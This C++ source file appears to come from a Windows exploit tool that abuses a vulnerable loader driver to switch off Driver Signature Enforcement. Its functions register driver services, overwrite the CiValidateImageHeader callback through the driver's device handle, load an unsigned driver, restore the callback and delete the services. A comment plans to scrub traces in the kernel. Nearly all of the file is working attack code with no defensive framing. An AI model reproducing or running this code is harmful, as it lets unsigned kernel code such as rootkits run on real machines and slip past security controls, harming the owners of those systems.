#include "includes.h"
#include "nt_structs.h"

NTSTATUS vuln::WindLoadDriver( PWCHAR LoaderName, PWCHAR DriverName, BOOLEAN Hidden )
{
	WCHAR LoaderPath[MAX_PATH] = { 0 };
	WCHAR DriverPath[MAX_PATH] = { 0 };

	constexpr ULONG SE_LOAD_DRIVER_PRIVILEGE = { 10UL };
	BOOLEAN SeLoadDriverWasEnabled{};

	std::wprintf( L"[+] WindLoadDriver called\n" );

	// Expand full paths
	NTSTATUS stat = RtlGetFullPathName_UEx( LoaderName, MAX_PATH * sizeof( WCHAR ), LoaderPath, nullptr, nullptr );
	if ( !NT_SUCCESS( stat ) ) return stat;

	stat = RtlGetFullPathName_UEx( DriverName, MAX_PATH * sizeof( WCHAR ), DriverPath, nullptr, nullptr );
	if ( !NT_SUCCESS( stat ) ) return stat;

	// Create loader driver service
	stat = helpers::CreateDriverService( LoaderServiceName, LoaderPath );
	if ( !NT_SUCCESS( stat ) ) return stat;

	// Create target driver service
	stat = helpers::CreateDriverService( DriverServiceName, DriverPath );
	if ( !NT_SUCCESS( stat ) ) return stat;

	// call prim
	std::wprintf( L"[+] Triggering exploit with:\n    Loader: %ls\n    Target: %ls\n", LoaderServiceName, DriverServiceName );
	wprintf( L"\n" );
	vuln::TriggerExploit( LoaderServiceName, DriverServiceName, 1 );

	return stat;
}

NTSTATUS vuln::TriggerExploit( PWSTR LoaderServiceName, PWSTR DriverServiceName, BOOL should_load ) {
	if ( !should_load )
		wprintf( L"[!] DEBUG -> No Loading Selected : %d\n", should_load );
	else
		wprintf( L"[!] DEBUG -> Loading Selected : %d\n", should_load );

	HANDLE deviceHandle = { nullptr };

	NTSTATUS stat = helpers::EnsureDeviceHandle( &deviceHandle, LoaderServiceName );
	if ( !NT_SUCCESS( stat ) ) return stat;

	auto ci = modules::get_CIValidate_ImageHeaderEntry();

	wprintf( L"[!] ciValidateImageHeaderEntry: %p\n", ci.ciValidateImageHeaderEntry );
	wprintf( L"[!] zwFlushInstructionCache   : %p\n", ci.zwFlushInstructionCache );

	DWORD64 originalCallback{};
	stat = helpers::ReadOriginalCallback( deviceHandle, ci.ciValidateImageHeaderEntry, originalCallback );
	if ( !NT_SUCCESS( stat ) ) goto cleanup;

	wprintf( L"[*] Original Callback : %p\n", originalCallback );

	if ( should_load ) {
		stat = helpers::WriteCallback( deviceHandle, ci.ciValidateImageHeaderEntry, ci.zwFlushInstructionCache ); //Spoof a cache reset via vuln driver
		if ( !NT_SUCCESS( stat ) ) goto cleanup;

		wprintf( L"[*] Attempting to load unsigned driver...\n" );
		stat = helpers::LoadDriver( DriverServiceName ); // ciValidateImageHeaderEntry structure waiting on cache reset -> DSE enforcment flags ignored, load driver
		if ( !NT_SUCCESS( stat ) ) goto cleanup;

		stat = helpers::WriteCallback( deviceHandle, ci.ciValidateImageHeaderEntry, originalCallback ); //restore flags
		if ( !NT_SUCCESS( stat ) ) goto cleanup;

		wprintf( L"[*] Restored callback\n" );
	}
cleanup:
	if ( deviceHandle ) NtClose( deviceHandle );
	helpers::UnloadDriver( LoaderServiceName );
	helpers::DeleteService( LoaderServiceName ); // These bottom two entries need to be done driver side -> TODO: make them driver side... and scrubbing entries kernel side, etc
	helpers::DeleteService( DriverServiceName );
	return stat;
}